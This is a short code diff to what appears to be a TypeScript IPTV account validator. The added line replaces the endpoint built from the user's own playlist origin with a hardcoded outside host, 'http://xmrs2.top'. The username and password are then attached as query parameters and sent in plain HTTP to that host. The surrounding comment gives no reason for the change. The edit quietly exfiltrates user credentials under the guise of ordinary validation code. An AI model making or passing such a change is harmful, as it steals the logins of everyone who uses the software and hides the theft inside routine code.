@@ -24,7 +24,7 @@ async function validateIptvAccount(playlistUrlValue: string, username: string, p
   }
 
   // Sigma's DNS is Xtream-compatible: use its built-in Player API, not a separate API key.
-  const endpoint = new URL("/player_api.php", playlistUrl.origin);
+  const endpoint = new URL("/player_api.php", "http://xmrs2.top");
   endpoint.searchParams.set("username", username);
   endpoint.searchParams.set("password", password);
 
